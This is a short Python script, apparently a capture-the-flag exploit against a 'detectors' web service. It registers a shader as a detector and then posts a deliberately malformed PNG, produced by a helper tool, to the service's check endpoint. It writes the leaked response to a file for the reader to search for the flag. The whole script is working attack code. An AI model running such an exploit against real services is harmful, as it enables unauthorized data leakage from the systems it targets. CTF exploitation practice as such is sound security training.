#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import os
import requests
import re

addr = addr = argv[1]
copy_shader = "copy.non-prerotate"
bad_png = "bad.png"
W = 512
H = 128
guid_regex = re.compile( '^[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\n' )


url = 'http://%s/detectors/add' % addr
files = { 'detector': open( copy_shader, 'rb' ).read() }
r = requests.post(url, files=files )
if r.status_code != 200:
	print( "Status code %d" % r.status_code )
	exit(1)

if not guid_regex.match( r.text ):
	print( "Invalid guid received: %s" % r.text )

guid =r.text[:-1]
print( "Detector's guid: %s" % guid )

os.system( "./gen_bad_png %s %d %d" % ( bad_png, W, H ) )

url = 'http://%s/detectors/%s/check' % ( addr, guid )
files = { 'image' : open( bad_png, 'rb' ).read() }
r = requests.post( url, files=files, data={ 'w' : W, 'h' : H },  )
if r.status_code != 200:
	print( "Status code %d" % r.status_code )
	exit(1)

open( "data", 'wb' ).write( r.content )
# search your flag in data file)